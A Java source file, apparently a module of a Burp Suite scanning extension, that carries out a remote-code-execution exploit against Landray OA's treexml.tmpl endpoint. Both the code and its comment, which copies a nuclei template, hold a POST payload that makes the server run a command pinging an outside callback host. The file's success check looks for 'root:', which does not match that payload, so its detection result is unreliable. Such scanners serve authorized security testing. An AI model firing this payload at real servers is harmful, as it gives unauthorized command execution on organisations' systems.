package com.alumm0x.task.cves.oa.landray;

import burp.IHttpRequestResponse;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import com.alumm0x.engine.TaskManager;
import com.alumm0x.impl.VulTaskImpl;
import com.alumm0x.ui.MainPanel;
import com.alumm0x.util.BurpReqRespTools;

import java.io.IOException;


public class LandrayOaTreexmlRce extends VulTaskImpl {
    /**
     * 蓝凌oa treecxml.templ命令执行
     *
     * yaml（https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce/blob/main/landray-oa-treexml-rce.yaml）
     * id: landray-oa-treexml-rce
     *
     * info:
     *   name: Landray OA treexml.tmpl Script RCE
     *   severity: high
     *   reference:
     *     - https://github.com/tangxiaofeng7
     *   tags: landray,oa,rce
     *
     * requests:
     *   - method: POST
     *     path:
     *       - '{{BaseURL}}/data/sys-common/treexml.tmpl'
     *
     *     body: |
     *         s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
     *     headers:
     *       Pragma: no-cache
     *       Content-Type: application/x-www-form-urlencoded
     *
     *     matchers:
     *       - type: word
     *         part: interactsh_protocol
     *         name: http
     *         words:
     *           - "dns"
     *           - "http"
     */

    public static VulTaskImpl getInstance(IHttpRequestResponse requestResponse){
        return new LandrayOaTreexmlRce(requestResponse);
    }
    private LandrayOaTreexmlRce(IHttpRequestResponse requestResponse) {
        super(requestResponse);
    }

    @Override
    public void run() {
        //新的请求包
        String url = BurpReqRespTools.getRootUrl(requestResponse) + "/data/sys-common/treexml.tmpl";
        // TODO 这里需要burp的一个域名，用于ping
        String poc_body = "s_bean=ruleFormulaValidate&script=try {String cmd = \"ping {{interactsh-url}}\";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}";
        //新请求
        okHttpRequester.send(
            url, 
            "POST", 
            BurpReqRespTools.getReqHeaders(requestResponse), 
            null, 
            poc_body, 
            BurpReqRespTools.getContentType(requestResponse), 
            new LandrayOaTreexmlRceCallback(this));
        TaskManager.vulsChecked.add(String.format("burp.vuls.oa.landray.LandrayOaTreexmlRce_%s_%s",BurpReqRespTools.getHost(requestResponse),BurpReqRespTools.getPort(requestResponse))); //添加检测标记
    }
}

class LandrayOaTreexmlRceCallback implements Callback {

    VulTaskImpl vulTask;

    public LandrayOaTreexmlRceCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        // 记录日志
        IHttpRequestResponse requestResponse = BurpReqRespTools.makeBurpReqRespFormOkhttp(call, null, vulTask.requestResponse);
        MainPanel.logAdd(
            requestResponse, 
            BurpReqRespTools.getHost(requestResponse), 
            BurpReqRespTools.getUrlPath(requestResponse),
            BurpReqRespTools.getMethod(requestResponse), 
            BurpReqRespTools.getStatus(requestResponse), 
            LandrayOaTreexmlRce.class.getSimpleName(),
            "onFailure", 
            "[LandrayOaTreexmlRceCallback-onFailure] " + e.getMessage());
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        String message = null;
        IHttpRequestResponse requestResponse = BurpReqRespTools.makeBurpReqRespFormOkhttp(call, response, vulTask.requestResponse);
        if (response.isSuccessful()){
            // 检查响应体是否有内容
            String respBody = new String(BurpReqRespTools.getRespBody(requestResponse));
            if (respBody.contains("root:")) {
                message = "LandrayOaTreexmlRce";
            }
        }
        // 记录日志
        MainPanel.logAdd(
            requestResponse, 
            BurpReqRespTools.getHost(requestResponse), 
            BurpReqRespTools.getUrlPath(requestResponse),
            BurpReqRespTools.getMethod(requestResponse), 
            BurpReqRespTools.getStatus(requestResponse), 
            LandrayOaTreexmlRce.class.getSimpleName(),
            message, 
            null);
    }
}